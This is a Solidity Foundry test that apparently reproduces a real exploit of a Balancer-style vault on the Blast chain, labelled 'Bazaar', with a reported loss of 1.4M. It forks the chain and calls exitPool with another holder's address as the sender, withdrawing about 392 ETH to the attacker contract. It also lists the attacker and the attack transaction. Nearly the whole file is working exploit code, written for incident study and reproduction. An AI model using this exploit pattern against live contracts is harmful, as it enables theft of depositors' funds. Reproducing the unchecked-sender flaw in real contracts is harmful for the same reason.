// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : 1.4M
// Attacker : https://blastscan.io/address/0x3cf5B87726Af770c94494E886d2A69c42A203884
// Attack Contract : https://blastscan.io/address/0xd31c7a22f4e6f928f1d4adabbc08c7bf88a3e402
// Vulnerable Contract : https://blastscan.io/address/0xefb4e3Cc438eF2854727A7Df0d0baf844484EdaB
// Attack Tx : https://blastscan.io/tx/0x7fdd140f7631f62d62f7256ee4a38af51a4723ad5d66adc9b9685bf78f750f2d

// @Info
// Vulnerable Contract Code : https://blastscan.io/address/0xefb4e3Cc438eF2854727A7Df0d0baf844484EdaB#code

// @Analysis
// Post-mortem :
// Twitter Guy : https://x.com/shoucccc/status/1800353122159833195
// Hacking God :
pragma solidity ^0.8.0;

contract Bazaar is BaseTestWithBalanceLog {
    uint256 private constant BLOCKNUM_TO_FORK_FROM = 4_619_716;
    uint256 private constant MAX_ETH_OUT = 850_000_000 ether;
    uint256 private constant EXPECTED_ETH = 392.368916743742801361 ether;

    address private constant WETH_ADDRESS = 0x4300000000000000000000000000000000000004;
    address private constant RYOLO_ADDRESS = 0x86cba7808127d76deaC14ec26eF6000Aa78b2eBb;
    address private constant VULN_VAULT_ADDRESS = 0xefb4e3Cc438eF2854727A7Df0d0baf844484EdaB;

    IWETH private constant weth = IWETH(payable(WETH_ADDRESS));
    IBalancerVault private constant vulnVault = IBalancerVault(VULN_VAULT_ADDRESS);

    address private constant HOLDER_TO_TAKE_FROM = 0xb66585C4E460D49154D50325CE60aDC44bc900E9;
    bytes32 private constant TARGET_ID = 0xdc4a9779d6084c1ab3e815b67ed5e6780ccf4d90000200000000000000000001;

    receive() external payable {}

    function setUp() public {
        vm.createSelectFork("blast", BLOCKNUM_TO_FORK_FROM);
        fundingToken = address(weth);
    }

    function testExploit() public balanceLog {
        vulnVault.exitPool(TARGET_ID, HOLDER_TO_TAKE_FROM, payable(address(this)), buildExitPoolRequest());
        assertEq(getFundingBal(), EXPECTED_ETH, "Did not get expected ETH");
    }

    function buildExitPoolRequest() private view returns (IBalancerVault.ExitPoolRequest memory) {
        IBalancerVault.ExitPoolRequest memory request = IBalancerVault.ExitPoolRequest({
            asset: new address[](2),
            minAmountsOut: new uint256[](2),
            userData: abi.encode(1, MAX_ETH_OUT),
            toInternalBalance: false
        });
        request.asset[0] = address(weth);
        request.asset[1] = RYOLO_ADDRESS;
        request.minAmountsOut[0] = 0;
        request.minAmountsOut[1] = 0;
        return request;
    }
}
